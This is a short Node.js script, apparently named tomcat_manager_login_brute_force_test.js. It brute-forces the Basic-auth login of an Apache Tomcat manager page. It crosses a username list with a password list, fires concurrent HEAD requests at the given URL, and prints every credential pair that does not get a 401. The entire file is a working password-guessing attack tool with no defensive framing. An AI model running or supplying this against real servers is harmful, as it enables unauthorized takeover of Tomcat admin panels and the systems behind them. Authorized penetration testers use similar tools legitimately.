var fs = require('fs');
var request = require('request');

var counter = 0;
var totalCount = 0;
var authorizationList = [];
var startTime = (new Date).getTime();
var options = {
    url: null,
    headers: {}
}
var maxThread = 16;
var consoleLength = 80;

var consoleLog = function (str, newLine) {
    var ss = [];
    ss[consoleLength - str.length] = newLine ? '\r\n' : '\033[0G';  // hacked: change line in WINDOWS
    process.stdout.write(str + ss.join(' '));
}

var readFile = function (fp, cb) {
    fs.readFile(fp, function (err, data) {
        return cb(data);
    });
};

var threadFunc = function () {
    var Authorization = authorizationList[--totalCount];
    if (totalCount < 0) {
        if (totalCount === 0 - maxThread) {
            consoleLog('------', true);
            consoleLog(['Cost time: ', ((new Date).getTime() - startTime) / 1000].join(''), true);
            return 1;
        } else {
            return 0;
        }
    }
    options.headers.Authorization = Authorization;
    request.head(options, function (err, data) {
        if (data.statusCode != 401) {
            consoleLog(['Good luck: {', data.statusCode, '} ', new Buffer(Authorization.split(' ')[1], 'base64').toString()].join(''), true);
        }
        return threadFunc();
    });
}

var callThreadFunc = function () {
    for (var i = maxThread; i >= 0; i--) {
        setTimeout(threadFunc, 8 * i);
    }
}

var lastCount = function () {
    if (totalCount > 0) {
        consoleLog(['Speed: ', counter - totalCount, 'L/S; ', 'Left: ', totalCount].join(''));
        counter = totalCount;
        setTimeout(lastCount, 1000);
    }
}

var main = function () {
    options.url = process.argv[2];
    var usnameFile = process.argv[3];
    var passwdFile = process.argv[4];
    if (!options.url || !usnameFile || !passwdFile) {
        consoleLog('Usage: tomcat_manager_login_brute_force_test.js http://192.168.152.132:8080/manager/html usname.txt passwd.txt', true);
        return 1;
    }
    readFile(usnameFile, function (uData) {
        readFile(passwdFile, function (pData) {
            var unameList = uData.toString().split('\r\n');
            var upassList = pData.toString().split('\r\n');
            uData = pData = null;
            counter = totalCount = unameList.length * upassList.length;
            if (totalCount < 1) {
                consoleLog('File of usname or passwd is empty.', true);
                return 1;
            } else {
                consoleLog(['Total count: ', totalCount].join(''), true);
                consoleLog('------', true);
            }
            unameList.forEach(function (u, m) {
                upassList.forEach(function (p, n) {
                    authorizationList.push('Basic ' + new Buffer(u + ':' + p).toString('base64'));
                });
            });
            callThreadFunc();
            lastCount();
        });
    });
}

main();
